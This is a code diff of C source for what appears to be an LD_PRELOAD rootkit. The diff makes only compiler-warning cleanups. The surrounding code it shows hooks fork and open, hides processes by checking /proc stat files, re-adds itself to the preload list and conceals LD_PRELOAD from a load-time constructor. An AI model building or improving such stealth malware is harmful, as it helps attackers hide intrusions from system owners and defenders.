@@ -20,7 +20,9 @@ LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.*/
 
+#ifndef _GNU_SOURCE
 #define _GNU_SOURCE
+#endif
 
 #include <sys/types.h>
 #include <dlfcn.h>
@@ -71,16 +73,18 @@ static pid_t _fork(void) {
 	return meta_fork("fork");
 }
 
+/*
 static pid_t _vfork(void) {
 	return meta_fork("vfork");
 }
+*/
 
 // utilities                                                                                    100#
 
 #define MAX_BUF_SIZE 256
 
 static void add_self_preload(void) {
-	Dl_info so_info = {0};
+	Dl_info so_info = {NULL, NULL, NULL, NULL};
 	cast func_ptr = {.void_func_ptr = add_self_preload}; // suppress ISO C warning
 	if (!dladdr(func_ptr.void_ptr, &so_info)) {
 		return;
@@ -97,7 +101,8 @@ static bool is_hidden(const char* const path) {
 		return false;
 	}
 	char buf[MAX_BUF_SIZE] = {0};
-	if(snprintf(buf, sizeof(buf), "/proc/%d/stat", pid) >= sizeof(buf)) {
+	int ret_size = snprintf(buf, sizeof(buf), "/proc/%d/stat", pid);
+	if (ret_size < 0 || (size_t)ret_size >= sizeof(buf)) {
 		return false;
 	}
 	int stat = _open(buf, O_RDONLY, 0);
@@ -119,7 +124,7 @@ static bool is_hidden(const char* const path) {
 }
 
 static bool is_preloaded(void) {
-	Dl_info so_info = {0};
+	Dl_info so_info = {NULL, NULL, NULL, NULL};
 	cast func_ptr = {.void_func_ptr = add_self_preload}; // suppress ISO C warning
 	if (!dladdr(func_ptr.void_ptr, &so_info)) {
 		return false;
@@ -167,8 +172,10 @@ int open (const char *pathname, int flags, ...){
 
 // init                                                                                         100#
 
+void init(void);
+
 __attribute__((constructor))
-void init() {
+void init(void) {
 	if (is_preloaded()) {
 		hide_ld_preload();
 	} else {
